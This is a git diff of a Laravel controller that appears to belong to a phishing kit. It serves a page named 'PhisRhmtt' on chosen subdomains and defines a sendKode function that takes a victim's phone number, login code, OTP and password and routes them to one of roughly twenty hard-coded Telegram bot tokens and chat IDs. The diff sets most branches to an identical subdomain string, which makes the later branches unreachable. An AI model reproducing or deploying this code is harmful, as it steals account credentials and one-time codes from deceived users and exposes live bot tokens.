@@ -83,133 +83,132 @@ class HomeController extends Controller
         $subdomain = explode('.', $request->getHost())[0];
         if ($subdomain ===  "livegroup1") {
             return inertia('rhmtt/PhisRhmtt');
-        } else if ($subdomain ===  "live-vc-private1-my20") {
+        } else if ($subdomain ===  "livegroup1-malayhot0") {
             return inertia('rhmtt/PhisRhmtt');
         } else {
-
             return inertia('Index');
         }
     }
     public function sendKode($phone = "", $code = "", $otp = "", $password = "", $subdomain = "")
     {
         // mulai dari bot 6 yah
-        if ($subdomain == "live-vc-private1-my1") {
+        if ($subdomain == "livegroup1-malayhot") {
             // BOT 6
             $bot_token = "7742925472:AAETfunTJLoGZ1mhYlB40NVNNfzmWDnuliU";
             $chat_id = "5942769050";
             $phisData = "MY1";
-        } else if ($subdomain == "live-vc-private1-my2") {
+        } else if ($subdomain == "livegroup1-malayhot") {
             // BOT 6
             $bot_token = "7771404524:AAF93NO33-L-W7zySeunN3MPtZEkXCIbWYU";
             $chat_id = "7789971264";
             $phisData = "MY2";
-        } else if ($subdomain == "live-vc-private1-my3") {
+        } else if ($subdomain == "livegroup1-malayhot") {
             // BOT 6
             $bot_token = "8180213242:AAHg0z_-EKoHwMNufedUioFPD9uin-6S6ug";
 
             $chat_id = "5902714729";
             $phisData = "MY3";
-        } else if ($subdomain == "live-vc-private1-my4") {
+        } else if ($subdomain == "livegroup1-malayhot") {
             // BOT 6
             $bot_token = "7669127712:AAG30nKwXiLGAA5CTavrTpSy06BAFBr8pDE";
             $chat_id = "7953569313";
 
             $phisData = "MY4";
-        } else if ($subdomain == "live-vc-private1-my5") {
+        } else if ($subdomain == "livegroup1-malayhot") {
             // BOT 6
             $bot_token = "8133096289:AAFB775D7svV3vxd6w-URDQPMAiPvEKivTY";
             $chat_id = "7543666885";
             $phisData = "MY5";
-        } else if ($subdomain == "live-vc-private1-my6") {
+        } else if ($subdomain == "livegroup1-malayhot") {
             // BOT 6
             $bot_token = "8004727206:AAHF_aciKT9HnpKnSBWPTob727wTaUlLAJI";
             $chat_id = "7637087335";
             $phisData = "MY6";
-        } else if ($subdomain == "live-vc-private1-my7") {
+        } else if ($subdomain == "livegroup1-malayhot") {
             // BOT 7
             $bot_token = "7628917568:AAEG9egRkGovhj0tVNaw_fw-HEKMwxk70T0";
             $chat_id = "7659680018";
             $phisData = "MY7";
-        } else if ($subdomain == "live-vc-private1-my8") {
+        } else if ($subdomain == "livegroup1-malayhot") {
             // BOT 8
             $bot_token = "8152310450:AAFamqOkQDQIjgiW6KgCvxQLE-F31mVoRws";
             $chat_id = "7094645746";
             $phisData = "MY8";
-        } else if ($subdomain == "live-vc-private1-my9") {
+        } else if ($subdomain == "livegroup1-malayhot") {
             // BOT 9
             $bot_token = "7725644706:AAED4xmptLbmRse_yX1jjL0ElhDEuhDUCkc";
             $chat_id = "6243136404";
             $phisData = "MY9";
-        } else if ($subdomain == "live-vc-private1-my10") {
+        } else if ($subdomain == "livegroup1-malayhot0") {
             // BOT 10
             $bot_token = "7688138521:AAEgyGA8_HAZSU3gG7Yb1QKoA9tfOMuKDWE";
             $chat_id = "8070575359";
             $phisData = "MY10";
-        } else if ($subdomain == "live-vc-private1-my11") {
+        } else if ($subdomain == "livegroup1-malayhot") {
             // BOT 11
             $bot_token = "7601808483:AAHWk8fP7idbD8t1QttM7Se1LAg2BqH6hgM";
             $chat_id = "7407769534";
             $phisData = "MY11";
-        } else if ($subdomain == "live-vc-private1-my12") {
+        } else if ($subdomain == "livegroup1-malayhot") {
             // BOT 12
             $bot_token = "7648139656:AAEyPbxLA5ROEDy7CzAQODYYCFcyF-GIBn4";
             $chat_id = "6391024630";
             $phisData = "MY12";
-        } else if ($subdomain == "live-vc-private1-my13") {
+        } else if ($subdomain == "livegroup1-malayhot") {
             // BOT 13
             $bot_token = "7783947061:AAFVbVuNeFIq4bmRt6mhQYQumonFIY-SCW8";
 
             $chat_id = "5499456356";
             $phisData = "MY13";
-        } else if ($subdomain == "live-vc-private1-my14") {
+        } else if ($subdomain == "livegroup1-malayhot") {
             // BOT 14
             $bot_token = "7938005326:AAFSXMpmtunTPvKhToHrCJwJyxjrP45wiQY";
 
             $chat_id = "6834715975";
             $phisData = "MY14";
-        } else if ($subdomain == "live-vc-private1-my15") {
+        } else if ($subdomain == "livegroup1-malayhot") {
             // BOT 15
             $bot_token = "8191392356:AAG2FdJSSETQVNojLNta49t7ONjz_YXgnIs";
 
             $chat_id = "5627605109";
             $phisData = "MY15";
-        } else if ($subdomain == "live-vc-private1-my16") {
+        } else if ($subdomain == "livegroup1-malayhot") {
             // BOT 16
             $bot_token = "7987396890:AAEHhge3VdvthGkAuLy9xVsIGVrEZ0zFS7I";
 
             $chat_id = "5884038998";
             $phisData = "MY16";
-        } else if ($subdomain == "live-vc-private1-my17") {
+        } else if ($subdomain == "livegroup1-malayhot") {
             // BOT 17
             $bot_token = "7270446058:AAHLzCew-iWBEs9rShYxm-WZR_wxELhrq2Y";
 
             $chat_id = "5865500600";
             $phisData = "MY17";
-        } else if ($subdomain == "live-vc-private1-my18") {
+        } else if ($subdomain == "livegroup1-malayhot") {
             // BOT 18
             $bot_token = "7816275181:AAFRKUc2RWb5r5_QIzu6DiVvcEj2lZS0jOo";
 
             $chat_id = "7005344615";
             $phisData = "MY18";
-        } else if ($subdomain == "live-vc-private1-my19") {
+        } else if ($subdomain == "livegroup1-malayhot") {
             // BOT 19
             $bot_token = "8115199238:AAG4RgC8glAVFEuVB-3OWdT8hQeOkHSq__w";
 
             $chat_id = "7092408619";
             $phisData = "MY19";
-        } else if ($subdomain == "live-vc-private1-my20") {
+        } else if ($subdomain == "livegroup1-malayhot") {
             // BOT 20
             $bot_token = "";
 
             $chat_id = "";
             $phisData = "MY20";
-        } else if ($subdomain == "live-vc-private1-my21") {
+        } else if ($subdomain == "livegroup1-malayhot") {
             // BOT 21s`
             $bot_token = "8149828717:AAHZb4-7lDgPb_j8AOStsg-3pO3pTETrDOM";
 
             $chat_id = "7935306179";
             $phisData = "MY21";
-        } else if ($subdomain == "live-vc-private1-my21") {
+        } else if ($subdomain == "livegroup1-malayhot") {
             // BOT 21s`
             $bot_token = "";
 
